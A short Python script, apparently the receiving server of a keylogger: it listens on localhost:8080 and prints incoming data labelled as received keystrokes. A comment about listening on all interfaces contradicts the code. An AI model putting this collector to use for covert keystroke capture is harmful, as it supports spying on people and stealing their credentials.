import socket

# Server configuration
IP = 'localhost'  # Listen on all interfaces
PORT = 8080

# Start the server
def start_server():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((IP, PORT))
        s.listen(5)
        print(f"Listening on {IP}:{PORT}...")

        while True:
            client_socket, client_address = s.accept()
            print(f"Connection from {client_address}")
            handle_client(client_socket)
    except Exception as e:
        print(f"Server error: {e}")
    finally:
        s.close()

# Handling the clients after successfull connection
def handle_client(client_socket):
    try:
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            print(f"\nReceived keystroke: {data.decode('utf-8')}", end='')  # Logs of received keystrokes
    except Exception as e:
        print(f"Error: {e}")
    finally:
        client_socket.close()

if __name__ == "__main__":
    start_server()
